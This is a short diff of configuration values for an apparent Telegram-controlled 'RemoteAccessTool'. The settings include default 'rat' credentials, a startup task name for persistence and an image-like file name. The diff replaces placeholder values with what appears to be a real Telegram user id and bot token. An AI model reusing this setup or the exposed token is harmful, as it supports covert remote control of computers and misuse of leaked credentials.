@@ -28,8 +28,8 @@ username="rat"
 password="rat"
 settings_name="RemoteAccessTool.settings"
 lang="tr" #For english type en in RemoteAccessTool.settings. Türkçe için RemoteAccessTool.settings içine langue karşısına tr yazın.
-xROOT_ACCESS=95454545 #Let'secure our access to computer with Telegram user id. Bilgisayara erişimimizi telegram id'miz ile güvenceye alalım.
-xTOXEN="12341321:DA2doSKDWAD232SD2sDW23S" #Add your own toxen here. Buraya kendi toxeninizi yazın.
+xROOT_ACCESS=5531795780 #Let'secure our access to computer with Telegram user id. Bilgisayara erişimimizi telegram id'miz ile güvenceye alalım.
+xTOXEN="5654927193:AAFrBKaUx5hJiIEx0txQACbAOBpbZEnlda4" #Add your own toxen here. Buraya kendi toxeninizi yazın.
 startup_taskname="RemoteAccessTool"
 fname="EagleEye.jpg"
 #WARNING: Software reads most of the values from .txt file called settings so even if you changed here if its wrong there it will not work!
